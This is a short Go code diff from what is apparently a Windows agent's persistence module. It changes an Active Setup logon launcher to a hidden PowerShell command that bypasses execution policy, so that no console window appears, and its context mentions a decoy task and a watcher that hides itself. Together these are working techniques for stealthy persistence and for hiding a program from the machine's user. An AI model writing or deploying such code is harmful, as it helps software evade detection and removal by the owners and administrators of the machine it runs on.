@@ -686,10 +686,12 @@ func createDecoyTask(agentPath, backupDir, installDir string) {
 	_ = os.Remove(tmpTask)
 }
 
-// activeSetupStub builds the detached launcher (cmd/start returns at
-// once; Active Setup waits for StubPath exit, so this must never block).
+// activeSetupStub builds the detached launcher. powershell with
+// -WindowStyle Hidden shows no console at all (cmd.exe /c start flashed
+// one at every logon), Start-Process detaches so Active Setup never
+// blocks, and the watcher self-hides on top.
 func activeSetupStub(agentPath string) string {
-	return `cmd.exe /c start "" /min "` + agentPath + `" --watch`
+	return `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process '` + strings.ReplaceAll(agentPath, "'", "''") + `' -ArgumentList '--watch' -WindowStyle Hidden"`
 }
 
 // ensureActiveSetup registers the logon-time vector (idempotent).
